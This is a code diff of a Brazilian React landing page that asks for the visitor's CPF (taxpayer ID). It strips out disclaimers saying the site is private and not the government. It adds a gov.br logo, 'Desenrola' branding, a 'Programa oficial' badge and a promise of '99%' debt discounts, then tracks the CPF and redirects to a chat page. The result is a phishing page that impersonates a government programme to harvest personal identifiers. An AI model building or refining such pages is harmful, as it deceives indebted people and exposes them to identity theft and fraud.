@@ -1,424 +1,202 @@
-import { createFileRoute, Link } from "@tanstack/react-router";
-import { useEffect, useRef, useState } from "react";
+import { createFileRoute } from "@tanstack/react-router";
+/** coloque uma mascara de cpf na caixa onde precisa preencher o cpf */
+import { useEffect, useState } from "react";
+import { media } from "@/lib/media";
 import { track } from "@/lib/tracking";
-import { defaultSiteContent, mergeSiteContent, type SiteContent } from "@/lib/site-content";
-import { EBOOKS, formatBRL } from "@/lib/ebooks";
+const iconeGov = { url: media.iconeGov };
+const limpeNome = { url: media.limpeNomeCpf };
+const iconeFooter = { url: media.iconeFooter };
+const logoLoading = { url: media.logoAmarelo };
 
 export const Route = createFileRoute("/")({
-  head: () => ({
-    meta: [
-      { title: "VEJA NEWS — Consulta informativa de CPF e orientação ao consumidor" },
-      {
-        name: "description",
-        content:
-          "Consulta informativa gratuita: informe seu CPF para localizar seu cadastro e receber orientação ao consumidor. Serviço privado e independente.",
-      },
-      { property: "og:title", content: "VEJA NEWS — Consulta informativa de CPF" },
-      {
-        property: "og:description",
-        content:
-          "Informe seu CPF para localizar seu cadastro e seguir para o atendimento. Conteúdo educativo e orientação ao consumidor.",
-      },
-      { property: "og:type", content: "website" },
-      { name: "twitter:card", content: "summary_large_image" },
-    ],
-  }),
-  component: Index,
+  component: CpfPage,
 });
 
-const ETAPAS = [
-  {
-    n: 1,
-    titulo: "Você inicia a verificação",
-    texto: "Informe o seu CPF no campo acima. Ele é usado uma única vez, apenas para localizar o seu cadastro.",
-  },
-  {
-    n: 2,
-    titulo: "Localizamos seu cadastro",
-    texto: "Consultamos o CPF em bases cadastrais parceiras, apenas para localizar o cadastro no seu nome.",
-  },
-  {
-    n: 3,
-    titulo: "Confirmamos sua identidade",
-    texto:
-      "Para proteger seus dados, pedimos que você confirme o nome da sua mãe e a sua data de nascimento antes de qualquer etapa seguinte.",
-  },
-  {
-    n: 4,
-    titulo: "Você segue para o atendimento",
-    texto: "Com a identidade confirmada, você continua para ver os detalhes do serviço e decidir se quer contratar.",
-  },
-];
-
-
-const SOMOS = [
-  "Uma empresa privada de consulta e orientação ao consumidor ({empresa}).",
-  "Um atendimento que explica, em linguagem simples, se há registros no seu nome.",
-  "Um serviço com primeira conversa gratuita e sem compromisso.",
-  "Uma empresa com CNPJ, endereço e canais de contato públicos, no rodapé desta página.",
-];
-
-const NAO_SOMOS = [
-  "Não somos o Governo Federal, Banco Central, Receita Federal, Serasa ou banco.",
-  "Não garantimos que existam valores no seu nome nem prometemos recebimento.",
-  "Não pedimos senhas, códigos de cartão ou fotos de documentos.",
-  "Não armazenamos as respostas digitadas na verificação deste site.",
-];
-
-const FAQ = [
-  {
-    q: "A consulta é gratuita?",
-    a: "Sim. A verificação inicial e a primeira conversa são gratuitas e sem compromisso. Qualquer serviço pago é apresentado com o preço antes de você decidir.",
-  },
-  {
-    q: "Por que preciso informar meu CPF?",
-    a: "O CPF é o identificador usado para localizar o seu cadastro nas bases cadastrais parceiras. Ele é usado apenas para essa localização.",
-  },
-  {
-    q: "Vocês têm vínculo com o governo?",
-    a: "Não. Somos uma empresa privada e independente, sem vínculo com o Governo Federal, Banco Central, Receita Federal, Serasa ou instituições financeiras.",
-  },
-  {
-    q: "Meus dados ficam salvos?",
-    a: "Não armazenamos as respostas digitadas na verificação deste site. Os dados são usados apenas durante o atendimento.",
-  },
-];
-
-function formatCPF(v: string) {
-  const d = v.replace(/\D/g, "").slice(0, 11);
-  if (d.length <= 3) return d;
-  if (d.length <= 6) return `${d.slice(0, 3)}.${d.slice(3)}`;
-  if (d.length <= 9) return `${d.slice(0, 3)}.${d.slice(3, 6)}.${d.slice(6)}`;
-  return `${d.slice(0, 3)}.${d.slice(3, 6)}.${d.slice(6, 9)}-${d.slice(9)}`;
-}
-
-function isValidCPF(value: string) {
-  const d = value.replace(/\D/g, "");
-  if (d.length !== 11 || /^(\d)\1{10}$/.test(d)) return false;
-  let s = 0;
-  for (let i = 1; i <= 9; i++) s += parseInt(d.charAt(i - 1)) * (11 - i);
-  let r = (s * 10) % 11;
-  if (r === 10 || r === 11) r = 0;
-  if (r !== parseInt(d.charAt(9))) return false;
-  s = 0;
-  for (let i = 1; i <= 10; i++) s += parseInt(d.charAt(i - 1)) * (12 - i);
-  r = (s * 10) % 11;
-  if (r === 10 || r === 11) r = 0;
-  return r === parseInt(d.charAt(10));
-}
-
-function Index() {
-  const [content, setContent] = useState<SiteContent>(defaultSiteContent);
+function CpfPage() {
   const [cpf, setCpf] = useState("");
-  const [aceite, setAceite] = useState(false);
-  const [erro, setErro] = useState("");
-  const [loading, setLoading] = useState(false);
-  const [cookies, setCookies] = useState(false);
-  const formRef = useRef<HTMLDivElement | null>(null);
-
+  const [isLoading, setIsLoading] = useState(false);
+  const [booting, setBooting] = useState(true);
+  useEffect(() => { track("home", "home_view"); }, []);
   useEffect(() => {
-    track("home", "home_view");
+    const t = setTimeout(() => setBooting(false), 2000);
+    return () => clearTimeout(t);
   }, []);
 
-  useEffect(() => {
-    if (!localStorage.getItem("cookies_ok")) setCookies(true);
-  }, []);
+  const formatCPF = (v: string) => {
+    const d = v.replace(/\D/g, "").slice(0, 11);
+    if (d.length <= 3) return d;
+    if (d.length <= 6) return `${d.slice(0, 3)}.${d.slice(3)}`;
+    if (d.length <= 9) return `${d.slice(0, 3)}.${d.slice(3, 6)}.${d.slice(6)}`;
+    return `${d.slice(0, 3)}.${d.slice(3, 6)}.${d.slice(6, 9)}-${d.slice(9)}`;
+  };
 
-  useEffect(() => {
-    let alive = true;
-    fetch("/api/public/site-content")
-      .then((r) => r.json())
-      .then((j) => {
-        if (alive && j?.ok) setContent(mergeSiteContent(j.content));
-      })
-      .catch(() => {});
-    return () => {
-      alive = false;
-    };
-  }, []);
+  const isValidCPF = (cpf: string) => {
+    const d = cpf.replace(/\D/g, "");
+    if (d.length !== 11 || /^(\d)\1{10}$/.test(d)) return false;
+    let s = 0;
+    for (let i = 1; i <= 9; i++) s += parseInt(d.charAt(i - 1)) * (11 - i);
+    let r = (s * 10) % 11;
+    if (r === 10 || r === 11) r = 0;
+    if (r !== parseInt(d.charAt(9))) return false;
+    s = 0;
+    for (let i = 1; i <= 10; i++) s += parseInt(d.charAt(i - 1)) * (12 - i);
+    r = (s * 10) % 11;
+    if (r === 10 || r === 11) r = 0;
+    return r === parseInt(d.charAt(10));
+  };
 
-  const submit = (e: React.FormEvent) => {
+  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    setCpf(formatCPF(e.target.value));
+  };
+
+  const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     const raw = cpf.replace(/\D/g, "");
     if (!isValidCPF(raw)) {
-      setErro("CPF inválido. Verifique os dígitos.");
+      alert("CPF inválido. Verifique os dígitos.");
       return;
     }
-    if (!aceite) {
-      setErro("É necessário confirmar a declaração acima.");
-      return;
-    }
-    setErro("");
-    track("cpf", "cpf_submit", { cpf: raw });
-    setLoading(true);
-    setTimeout(() => {
-      window.location.href = `/chat2?cpf=${raw}`;
-    }, 1800);
-  };
 
-  const irParaFormulario = () => {
-    formRef.current?.scrollIntoView({ behavior: "smooth", block: "center" });
+    track("cpf", "cpf_submit", { cpf: raw });
+    setIsLoading(true);
+
+    // Pequeno atraso para mostrar a mensagem de consulta antes do redirecionamento
+    setTimeout(() => {
+      window.location.href = `/chat?cpf=${raw}`;
+    }, 2500);
   };
 
   return (
-    <div className="min-h-screen bg-verde-suave font-['Open_Sans',sans-serif] text-texto-escuro">
-      <div className="mx-auto w-full max-w-[520px] bg-white">
-        {/* Faixa de aviso (editável no painel) */}
-        <div className="bg-aviso-bg px-4 py-3 text-center text-[11.5px] leading-[1.5] text-texto-escuro">
-          {content.banner_text}
-        </div>
+    <div className="flex flex-col min-h-screen font-['Open_Sans',sans-serif] bg-cinza-bg">
+      <div className="flex-1 w-full max-w-[720px] mx-auto bg-azul-footer-copy">
+        <div className="bg-cinza-bg flex flex-col min-h-screen">
+          <header className="sticky top-0 z-50 flex items-center justify-between w-full min-h-[56px] px-[14px] py-2 bg-white border-b border-[#e5e5e5] shadow-[0_1px_3px_rgba(0,0,0,0.06)]">
+            <span className="flex items-center shrink-0" aria-label="gov.br">
+              <img
+                src={iconeGov.url}
+                alt=""
+                className="h-9 w-auto max-w-[132px] block object-contain"
+                width="100"
+                height="32"
+              />
+            </span>
+            <div className="flex items-center gap-0 shrink-0 ml-auto">
+              <button type="button" className="hdr-icon-btn" aria-label="Alto contraste">
+                <svg className="w-[22px] h-[22px]" viewBox="0 0 24 24">
+                  <circle cx="12" cy="12" r="9.25" fill="none" stroke="#1451B4" strokeWidth="1.15"></circle>
+                  <path fill="#1451B4" d="M12 2.75 A9.25 9.25 0 0 0 12 21.25 z"></path>
+                  <path fill="#ffffff" d="M12 2.75 A9.25 9.25 0 0 1 12 21.25 z"></path>
+                </svg>
+              </button>
+              <span className="w-px h-[18px] bg-[#1451b440] shrink-0 mx-0" />
+              <button type="button" className="hdr-icon-btn" aria-label="Acessibilidade auditiva">
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+                  <path d="M6 8.5 a6 6 0 0 1 12 0 v3 a3 3 0 0 0 3 3 v0 a3 3 0 0 1 -3 3 h-1"></path>
+                  <path d="M18 11 v4 a4 4 0 0 1 -8 0 v-2"></path>
+                </svg>
+              </button>
+            </div>
+          </header>
 
-        {/* Header */}
-        <header className="flex items-center justify-center gap-2.5 bg-white px-4 py-3.5">
-          <span className="flex h-9 w-9 items-center justify-center rounded-full bg-verde-primario text-white">
-            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.4" strokeLinecap="round">
-              <circle cx="11" cy="11" r="7" />
-              <line x1="16.5" y1="16.5" x2="21" y2="21" />
-            </svg>
-          </span>
-          <strong className="text-[19px] font-extrabold tracking-tight">VEJA NEWS</strong>
-        </header>
+          <section className="relative bg-white mx-4 mt-3 mb-4 pt-5 pb-9 px-[18px] rounded-xl shadow-[0_4px_20px_rgba(0,0,0,0.08)] text-center">
+            <img className="max-w-[200px] max-h-24 w-full h-auto object-contain mx-auto mb-3.5 block" src={limpeNome.url} alt="Limpe seu nome" />
 
-        {/* Hero + formulário */}
-        <section className="bg-verde-suave px-4 pb-8 pt-6 text-center">
-          <span className="inline-block rounded-full bg-verde-badge px-4 py-1.5 text-[10.5px] font-bold uppercase tracking-[0.09em] text-verde-primario">
-            Consulta informativa
-          </span>
+            <p className="text-sm text-cinza-texto leading-6 mb-5">
+              ✅ ATUALIZADO - Informe seu CPF e clique em "Continuar" para<br />
+              renegociar suas dívidas com descontos de 99%
+            </p>
 
-          <h1 className="mx-auto mt-4 max-w-[330px] text-[26px] font-extrabold leading-[1.22] tracking-tight">
-            <span className="bg-destaque-amarelo px-1.5 py-0.5">Resolva seu nome</span>
-            <br />
-            agora mesmo, confirme apenas algumas informações abaixo.
-          </h1>
-
-          <div
-            ref={formRef}
-            className="mt-6 rounded-2xl bg-white p-5 text-left shadow-[0_6px_24px_rgba(16,36,29,0.08)]"
-          >
-            <h2 className="text-center text-[16px] font-bold">Digite seu CPF</h2>
-
-            <form onSubmit={submit} className="mt-4">
+            <form className="text-left" onSubmit={handleSubmit}>
+              <div className="text-sm font-bold text-[#333] mb-2">CPF</div>
               <input
+                className="w-full px-4 py-3.5 border border-borda-input rounded-lg text-base outline-none focus:border-azul-primario mb-4"
                 type="tel"
-                inputMode="numeric"
                 value={cpf}
-                onChange={(e) => setCpf(formatCPF(e.target.value))}
+                onChange={handleCpfChange}
+                inputMode="numeric"
                 placeholder="000.000.000-00"
-                aria-label="CPF"
-                className="w-full rounded-full border border-[#e3e8e5] bg-[#fafbfa] px-5 py-3.5 text-[15px] text-texto-escuro outline-none placeholder:text-[#9aa5a0] focus:border-verde-primario"
                 required
               />
 
-              <label className="mt-4 flex items-start gap-2.5 text-[11.5px] leading-[1.5] text-texto-azulado">
-                <input
-                  type="checkbox"
-                  checked={aceite}
-                  onChange={(e) => setAceite(e.target.checked)}
-                  className="mt-0.5 h-4 w-4 shrink-0 accent-verde-primario"
-                />
-                <span>Declaro que sou o titular do CPF informado e que tenho mais de 18 anos.</span>
-              </label>
-
-              <p className="mt-3 text-center text-[11px] leading-[1.55] text-texto-azulado">
-                Ao continuar, você concorda com a{" "}
-                <a href="#politica" className="font-semibold underline">
-                  Política de Privacidade
-                </a>{" "}
-                e os{" "}
-                <a href="#termos" className="font-semibold underline">
-                  Termos de Uso
-                </a>
-                . Atendimento destinado a maiores de 18 anos.
-              </p>
-
-              {erro && <p className="mt-3 text-center text-[12px] font-semibold text-red-600">{erro}</p>}
-
-              <button type="submit" disabled={loading} className="btn-verde mt-4">
-                {loading ? "Consultando..." : "Consultar meu CPF"}
+              <button type="submit" className="btn-primary mt-0">
+                Continuar
               </button>
             </form>
 
-            <p className="mt-4 text-center text-[12px] text-texto-azulado">
-              <button type="button" onClick={irParaFormulario} className="font-semibold text-texto-escuro underline">
-                Veja aqui
-              </button>{" "}
-              como funciona a sua consulta.
-            </p>
-          </div>
-        </section>
+            <div className="mt-6 p-4 bg-info-bg border border-info-borda rounded-lg flex gap-3 text-left">
+              <span className="shrink-0 w-6 h-6 flex items-center justify-center bg-azul-primario text-white rounded-full text-sm font-bold">!</span>
+              <p className="text-sm text-foreground leading-snug">
+                O Programa Desenrola Brasil oferece acordos com descontos de 99% e recuperação de crédito imediata!
+              </p>
+            </div>
 
-        {/* Como funciona */}
-        <section className="bg-white px-4 py-9">
-          <h2 className="text-center text-[22px] font-extrabold leading-tight">Como funciona a verificação</h2>
-          <p className="mx-auto mt-3 max-w-[330px] text-center text-[13px] leading-[1.55] text-texto-azulado">
-            Um processo transparente, em quatro etapas, para você saber exatamente o que acontece com os seus dados.
-          </p>
+            <div className="mt-6 flex justify-center gap-6 text-black">
+              <span className="flex items-center gap-1.5 text-xs">
+                <svg className="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+                  <rect x="5" y="11" width="14" height="10" rx="2"></rect>
+                  <path d="M8 11V7a4 4 0 0 1 8 0v4"></path>
+                </svg>
+                Conexão segura
+              </span>
+              <span className="flex items-center gap-1.5 text-xs">
+                <svg className="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+                  <path d="M9 12l2 2 4-4" strokeLinecap="round" strokeLinejoin="round"></path>
+                </svg>
+                Programa oficial
+              </span>
+            </div>
+            <p className="mt-4 text-[10px] text-black">Sistema de Renegociação — Todos os direitos reservados</p>
+          </section>
 
-          <div className="mt-6 flex flex-col gap-3">
-            {ETAPAS.map((e) => (
-              <div key={e.n} className="rounded-2xl bg-verde-suave p-4">
-                <div className="flex items-center gap-3">
-                  <span className="flex h-7 w-7 shrink-0 items-center justify-center rounded-full bg-verde-badge text-[12px] font-bold text-verde-primario">
-                    {e.n}
-                  </span>
-                  <strong className="text-[15px] font-bold leading-tight">{e.titulo}</strong>
-                </div>
-                <p className="mt-2.5 text-[13px] leading-[1.55] text-texto-azulado">{e.texto}</p>
+          <footer className="mt-auto bg-azul-footer text-white">
+            <div className="max-w-[720px] mx-auto px-5 py-8 flex flex-col items-center text-center gap-4">
+              <img src={iconeFooter.url} alt="" className="h-10 w-auto" width="120" height="40" />
+              <div className="flex flex-col gap-1">
+                <p className="text-xs opacity-80">Todo o conteúdo deste site está publicado sob a licença</p>
+                <strong className="text-sm font-bold">Sistema de Renegociação — Todos os direitos reservados</strong>
               </div>
-            ))}
-          </div>
-        </section>
-
-        {/* E-books */}
-        <section className="bg-verde-suave px-4 py-9 text-center">
-          <span className="inline-block rounded-full bg-verde-badge px-4 py-1.5 text-[10.5px] font-bold uppercase tracking-[0.09em] text-verde-primario">
-            Guias educativos
-          </span>
-          <h2 className="mx-auto mt-4 max-w-[300px] text-[22px] font-extrabold leading-tight">
-            E-books para organizar sua vida financeira
-          </h2>
-          <p className="mx-auto mt-3 max-w-[320px] text-[13px] leading-[1.55] text-texto-azulado">
-            Conteúdo 100% educativo e informativo. Não é assessoria financeira, consultoria de investimento nem promessa
-            de recuperação de valores.
-          </p>
-
-          <div className="mt-6 flex flex-col gap-4 text-left">
-            {EBOOKS.map((b) => (
-              <div key={b.titulo} className="rounded-2xl bg-white p-5 shadow-[0_4px_18px_rgba(16,36,29,0.06)]">
-                <strong className="block text-[15.5px] font-bold leading-snug">{b.titulo}</strong>
-                <p className="mt-2 text-[13px] leading-[1.55] text-texto-azulado">{b.desc}</p>
-                <ul className="mt-3 flex flex-col gap-1.5">
-                  {b.itens.map((i) => (
-                    <li key={i} className="flex gap-2 text-[12.5px] leading-snug text-texto-azulado">
-                      <span className="text-verde-primario">•</span>
-                      {i}
-                    </li>
-                  ))}
-                </ul>
-                <p className="mt-4 text-[19px] font-extrabold text-verde-primario">{formatBRL(b.priceCents)}</p>
-                <a href={`/checkout?p=${b.slug}`} className="btn-verde mt-3 block text-center">
-                  Comprar e-book
-                </a>
-              </div>
-            ))}
-          </div>
-
-          <p className="mx-auto mt-5 max-w-[330px] text-[11.5px] leading-[1.55] text-texto-azulado">
-            Produtos digitais com entrega por e-mail após a confirmação do pagamento. Preço único e fixo, sem variação
-            por origem de acesso.
-          </p>
-        </section>
-
-        {/* Por que pedimos o CPF */}
-        <section className="bg-white px-4 py-9">
-          <h2 className="text-center text-[22px] font-extrabold leading-tight">Por que pedimos o seu CPF?</h2>
-          <p className="mt-4 text-[13.5px] leading-[1.6] text-texto-azulado">
-            O CPF é o identificador usado para localizar o seu cadastro nas bases cadastrais parceiras que consultamos.
-            Sem ele, não é possível dizer se existe algum registro vinculado ao seu nome.
-          </p>
-          <p className="mt-3 text-[13.5px] leading-[1.6] text-texto-azulado">
-            Depois da consulta, pedimos que você confirme o nome da sua mãe e a sua data de nascimento. Essa confirmação
-            existe para a sua proteção: garante que as informações do cadastro sejam mostradas apenas ao próprio titular.
-          </p>
-
-          <div className="mt-6 rounded-2xl bg-verde-suave p-5">
-            <strong className="block text-[16px] font-bold">O que a VEJA NEWS é</strong>
-            <ul className="mt-3 flex flex-col gap-3">
-              {SOMOS.map((raw) => raw.replace("{empresa}", content.company_name)).map((s) => (
-                <li key={s} className="flex gap-2.5 text-[13px] leading-[1.55] text-texto-azulado">
-                  <svg className="mt-0.5 h-4 w-4 shrink-0 text-verde-primario" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.6" strokeLinecap="round" strokeLinejoin="round">
-                    <path d="M4 12.5l5 5L20 6.5" />
-                  </svg>
-                  {s}
-                </li>
-              ))}
-            </ul>
-          </div>
-
-          <div className="mt-4 rounded-2xl bg-verde-suave p-5">
-            <strong className="block text-[16px] font-bold">O que a VEJA NEWS não é</strong>
-            <ul className="mt-3 flex flex-col gap-3">
-              {NAO_SOMOS.map((s) => (
-                <li key={s} className="flex gap-2.5 text-[13px] leading-[1.55] text-texto-azulado">
-                  <svg className="mt-0.5 h-4 w-4 shrink-0 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.6" strokeLinecap="round">
-                    <path d="M6 6l12 12M18 6L6 18" />
-                  </svg>
-                  {s}
-                </li>
-              ))}
-            </ul>
-          </div>
-
-          <p className="mt-6 text-center text-[12.5px] leading-[1.6] text-texto-azulado">
-            Você também pode consultar gratuitamente os canais oficiais, como o sistema Valores a Receber do Banco
-            Central (bcb.gov.br) e o site da Receita Federal.
-          </p>
-        </section>
-
-        {/* FAQ */}
-        <section className="bg-verde-suave px-4 py-9">
-          <h2 className="text-center text-[22px] font-extrabold leading-tight">Perguntas frequentes</h2>
-          <div className="mt-6 flex flex-col gap-3">
-            {FAQ.map((f) => (
-              <details key={f.q} className="group rounded-2xl bg-white px-4 py-3.5 shadow-[0_3px_14px_rgba(16,36,29,0.05)]">
-                <summary className="flex cursor-pointer list-none items-center justify-between gap-3 text-[14px] font-bold">
-                  {f.q}
-                  <span className="text-verde-primario transition-transform group-open:rotate-180">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.6" strokeLinecap="round">
-                      <path d="M6 9l6 6 6-6" />
-                    </svg>
-                  </span>
-                </summary>
-                <p className="mt-3 text-[13px] leading-[1.6] text-texto-azulado">{f.a}</p>
-              </details>
-            ))}
-          </div>
-          <p className="mt-6 text-center text-[11.5px] text-texto-azulado">
-            Atendimento destinado apenas a maiores de 18 anos.
-          </p>
-        </section>
-
-        {/* Rodapé (editável no painel) */}
-        <footer className="bg-rodape px-5 py-9 text-white">
-          <strong className="block text-[15px] font-bold leading-snug">{content.footer_title}</strong>
-          <p className="mt-3 text-[13px] leading-[1.6] text-white/85">
-            Atendimento: <strong className="font-bold text-white">{content.footer_atendimento_email}</strong> ·{" "}
-            {content.footer_atendimento_prazo}
-          </p>
-          <p className="mt-4 text-[12.5px] leading-[1.6] text-white/75">
-            {content.footer_empresa}
-            <br />
-            {content.footer_endereco} · Telefone: {content.footer_telefone}
-          </p>
-          <p className="mt-4 text-[11.5px] leading-[1.65] text-white/60">{content.footer_disclaimer}</p>
-          <div className="mt-5 flex flex-wrap gap-5 text-[12px] font-semibold text-white/85">
-            <a href="/politica-de-privacidade">Política de Privacidade</a>
-            <a href="/termos-de-uso">Termos de Uso</a>
-            <Link to="/contato">Contato</Link>
-          </div>
-        </footer>
+            </div>
+            <div className="bg-azul-footer-copy h-2 w-full" />
+          </footer>
+        </div>
       </div>
 
-      {cookies && (
-        <div className="fixed inset-x-0 bottom-0 z-50 mx-auto w-full max-w-[520px] rounded-t-2xl bg-white px-5 py-4 shadow-[0_-6px_24px_rgba(16,36,29,0.14)]">
-          <p className="text-center text-[11.5px] leading-[1.55] text-texto-azulado">
-            Usamos cookies e ferramentas de medição para entender a origem dos visitantes e melhorar o serviço. Ao
-            continuar, você concorda conforme a nossa{" "}
-            <a href="#politica" className="font-semibold underline">
-              Política de Privacidade
-            </a>
-            .
-          </p>
-          <button
-            type="button"
-            onClick={() => {
-              localStorage.setItem("cookies_ok", "1");
-              setCookies(false);
-            }}
-            className="btn-verde mt-3"
-          >
-            Entendi e aceito
-          </button>
+      {booting && (
+        <div className="fixed inset-0 z-[200] flex flex-col items-center justify-center bg-white">
+          <img
+            src={logoLoading.url}
+            alt="Desenrola"
+            className="w-[140px] max-w-[45vw] h-auto object-contain animate-fade-in"
+            width="140"
+            height="115"
+          />
+          <div
+            className="mt-8 w-8 h-8 rounded-full border-[3px] border-amarelo/25 border-t-amarelo animate-spin"
+            role="status"
+            aria-label="Carregando"
+          />
+        </div>
+      )}
+
+      {isLoading && (
+        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/50 backdrop-blur-sm animate-in fade-in duration-300">
+          <div className="bg-white rounded-2xl p-8 flex flex-col items-center gap-5 shadow-2xl max-w-[90%] w-[320px] text-center transform animate-in zoom-in-95 duration-300">
+            <div className="relative">
+              <div className="w-14 h-14 border-4 border-azul-primario/20 border-t-azul-primario rounded-full animate-spin"></div>
+              <div className="absolute inset-0 flex items-center justify-center">
+                <svg className="w-6 h-6 text-azul-primario" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3">
+                  <path d="M21 12a9 9 0 11-6.219-8.56" strokeLinecap="round" />
+                </svg>
+              </div>
+            </div>
+            <div>
+              <h3 className="text-azul-primario font-bold text-lg mb-1">Aguarde</h3>
+              <p className="text-cinza-texto text-sm leading-relaxed">
+                Estamos localizando suas propostas exclusivas no sistema...
+              </p>
+            </div>
+          </div>
         </div>
       )}
     </div>
